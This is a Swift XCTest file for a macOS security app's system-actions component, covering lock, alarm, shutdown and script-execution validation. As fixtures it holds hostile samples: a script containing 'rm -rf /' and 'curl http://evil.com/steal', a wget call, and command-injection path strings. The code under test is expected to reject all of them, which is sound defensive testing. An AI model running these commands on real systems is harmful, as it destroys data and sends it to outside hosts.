//
//  MacSystemActionsTests.swift
//  MagSafe Guard
//
//  Created on 2025-08-06.
//
//  Tests for MacSystemActions implementation.
//

@testable import MagSafeGuard
import XCTest

final class MacSystemActionsTests: XCTestCase {

    var sut: MacSystemActions!
    var testScriptPath: String!
    var tempDir: URL!

    override func setUp() {
        super.setUp()

        // Create temp directory for test scripts
        tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)

        // Use mock paths for testing
        let mockPaths = MacSystemActions.SystemPaths(
            pmsetPath: "/usr/bin/pmset",
            osascriptPath: "/usr/bin/osascript",
            killallPath: "/usr/bin/killall",
            sudoPath: "/usr/bin/sudo",
            bashPath: "/bin/bash"
        )

        sut = MacSystemActions(systemPaths: mockPaths)

        // Create a test script
        testScriptPath = tempDir.appendingPathComponent("test_script.sh").path
        let scriptContent = """
            #!/bin/bash
            echo "Test script executed"
            exit 0
            """
        try? scriptContent.write(toFile: testScriptPath, atomically: true, encoding: .utf8)

        // Make script executable
        try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: testScriptPath)
    }

    override func tearDown() {
        // Clean up temp directory
        try? FileManager.default.removeItem(at: tempDir)

        sut = nil
        testScriptPath = nil
        tempDir = nil
        super.tearDown()
    }

    // MARK: - Lock Screen Tests

    func testLockScreenExecution() throws {
        // This test would normally interact with system APIs
        // In CI environment, we just verify the method doesn't crash
        let ciMode = ProcessInfo.processInfo.environment["CI"] == "true"

        if ciMode {
            // In CI, just verify the method is callable
            XCTAssertNoThrow({
                // We can't actually test screen locking in CI
                // Just verify the implementation exists
                _ = sut.lockScreen
            }())
        }
    }

    // MARK: - Play Alarm Tests

    func testPlayAlarmValidVolume() throws {
        // Test valid volume ranges
        XCTAssertNoThrow(try sut.playAlarm(volume: 0.0))
        sut.stopAlarm()

        XCTAssertNoThrow(try sut.playAlarm(volume: 0.5))
        sut.stopAlarm()

        XCTAssertNoThrow(try sut.playAlarm(volume: 1.0))
        sut.stopAlarm()
    }

    func testStopAlarm() {
        // Test that stop alarm doesn't crash
        sut.stopAlarm()

        // Start and stop
        try? sut.playAlarm(volume: 0.5)
        sut.stopAlarm()
    }

    // MARK: - Force Logout Tests

    func testForceLogoutExecution() {
        // This test would normally trigger system logout
        // In CI environment, we just verify the method doesn't crash
        let ciMode = ProcessInfo.processInfo.environment["CI"] == "true"

        if ciMode {
            // In CI, just verify the method is callable
            XCTAssertNoThrow({
                _ = sut.forceLogout
            }())
        }
    }

    // MARK: - Shutdown Tests

    func testScheduleShutdownValidation() throws {
        // Test valid delay ranges
        XCTAssertNoThrow(try sut.scheduleShutdown(afterSeconds: 60))
        XCTAssertNoThrow(try sut.scheduleShutdown(afterSeconds: 1800))
        XCTAssertNoThrow(try sut.scheduleShutdown(afterSeconds: 3600))
    }

    func testScheduleShutdownInvalidDelay() {
        // Test negative delay
        XCTAssertThrowsError(try sut.scheduleShutdown(afterSeconds: -1)) { error in
            guard let systemError = error as? SystemActionError else {
                XCTFail("Wrong error type")
                return
            }
            if case .invalidShutdownDelay = systemError {
                // Expected
            } else {
                XCTFail("Wrong SystemActionError type: \(systemError)")
            }
        }

        // Test delay too large
        XCTAssertThrowsError(try sut.scheduleShutdown(afterSeconds: 3601)) { error in
            guard let systemError = error as? SystemActionError else {
                XCTFail("Wrong error type")
                return
            }
            if case .invalidShutdownDelay = systemError {
                // Expected
            } else {
                XCTFail("Wrong SystemActionError type: \(systemError)")
            }
        }
    }

    func testScheduleShutdownSanitization() throws {
        // Test that integer conversion prevents injection
        // After our fix, minutes are validated to be 1-60
        XCTAssertNoThrow(try sut.scheduleShutdown(afterSeconds: 30))
        XCTAssertNoThrow(try sut.scheduleShutdown(afterSeconds: 3599))
    }

    // MARK: - Execute Script Tests

    func testExecuteScriptValidPath() throws {
        // Test execution with valid script
        XCTAssertNoThrow(try sut.executeScript(at: testScriptPath))
    }

    func testExecuteScriptInvalidPaths() {
        let invalidPaths = [
            "relative/path.sh",        // Test relative path rejection
            "/path/../dangerous.sh",    // Test path traversal rejection
            "/path/$(whoami).sh",       // Test command substitution rejection
            "/path/`command`.sh",       // Test backtick rejection
            "/path/${USER}.sh"          // Test variable expansion rejection
        ]

        for path in invalidPaths {
            assertThrowsInvalidScriptPath(for: path)
        }
    }

    private func assertThrowsInvalidScriptPath(for path: String) {
        XCTAssertThrowsError(try sut.executeScript(at: path)) { error in
            guard let systemError = error as? SystemActionError else {
                XCTFail("Wrong error type for path: \(path)")
                return
            }
            if case .invalidScriptPath = systemError {
                // Expected
            } else {
                XCTFail("Wrong SystemActionError type: \(systemError) for path: \(path)")
            }
        }
    }

    func testExecuteScriptTildeExpansion() {
        // Test tilde expansion rejection
        assertThrowsInvalidScriptPath(for: "~/script.sh")
    }

    func testExecuteScriptNonExistentFile() {
        let nonExistentPath = "/tmp/non_existent_script_\(UUID().uuidString).sh"

        XCTAssertThrowsError(try sut.executeScript(at: nonExistentPath)) { error in
            guard let systemError = error as? SystemActionError else {
                XCTFail("Wrong error type")
                return
            }
            if case .scriptNotFound = systemError {
                // Expected
            } else {
                XCTFail("Wrong SystemActionError type: \(systemError)")
            }
        }
    }

    func testExecuteScriptNonExecutable() throws {
        // Create non-executable file
        let nonExecPath = tempDir.appendingPathComponent("non_exec.sh").path
        try "#!/bin/bash\necho test".write(toFile: nonExecPath, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o644], ofItemAtPath: nonExecPath)

        XCTAssertThrowsError(try sut.executeScript(at: nonExecPath)) { error in
            guard let systemError = error as? SystemActionError else {
                XCTFail("Wrong error type")
                return
            }
            if case .scriptNotExecutable = systemError {
                // Expected
            } else {
                XCTFail("Wrong SystemActionError type: \(systemError)")
            }
        }
    }

    func testExecuteScriptMaliciousContent() throws {
        // Create script with potentially malicious content
        let maliciousPath = tempDir.appendingPathComponent("malicious.sh").path
        let maliciousContent = """
            #!/bin/bash
            rm -rf /
            curl http://evil.com/steal
            """
        try maliciousContent.write(toFile: maliciousPath, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: maliciousPath)

        XCTAssertThrowsError(try sut.executeScript(at: maliciousPath)) { error in
            guard let systemError = error as? SystemActionError else {
                XCTFail("Wrong error type")
                return
            }
            if case .scriptValidationFailed = systemError {
                // Expected
            } else {
                XCTFail("Wrong SystemActionError type: \(systemError)")
            }
        }
    }

    func testExecuteScriptWithNetworkCommands() throws {
        // Create script with network commands
        let networkPath = tempDir.appendingPathComponent("network.sh").path
        let networkContent = """
            #!/bin/bash
            wget http://example.com
            """
        try networkContent.write(toFile: networkPath, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: networkPath)

        XCTAssertThrowsError(try sut.executeScript(at: networkPath)) { error in
            guard let systemError = error as? SystemActionError else {
                XCTFail("Wrong error type")
                return
            }
            if case .scriptValidationFailed = systemError {
                // Expected
            } else {
                XCTFail("Wrong SystemActionError type: \(systemError)")
            }
        }
    }

    // MARK: - System Paths Tests

    func testSystemPathsStandard() {
        let paths = MacSystemActions.SystemPaths.standard
        XCTAssertEqual(paths.pmsetPath, "/usr/bin/pmset")
        XCTAssertEqual(paths.osascriptPath, "/usr/bin/osascript")
        XCTAssertEqual(paths.bashPath, "/bin/bash")
        XCTAssertEqual(paths.killallPath, "/usr/bin/killall")
        XCTAssertEqual(paths.sudoPath, "/usr/bin/sudo")
    }

    func testSystemPathsCustom() {
        let customPaths = MacSystemActions.SystemPaths(
            pmsetPath: "/custom/pmset",
            osascriptPath: "/custom/osascript",
            killallPath: "/custom/killall",
            sudoPath: "/custom/sudo",
            bashPath: "/custom/bash"
        )

        let customActions = MacSystemActions(systemPaths: customPaths)
        XCTAssertNotNil(customActions)
    }

    // MARK: - Error Description Tests

    func testSystemActionErrorDescriptions() {
        let errors: [SystemActionError] = [
            .screenLockFailed,
            .alarmPlaybackFailed,
            .logoutFailed,
            .shutdownFailed,
            .scriptNotFound,
            .scriptNotExecutable,
            .scriptExecutionFailed(exitCode: 1),
            .scriptValidationFailed(reason: "Test reason"),
            .invalidScriptPath,
            .invalidShutdownDelay,
            .permissionDenied
        ]

        for error in errors {
            XCTAssertFalse(error.errorDescription?.isEmpty ?? true,
                           "Error \(error) should have description")
        }
    }
}
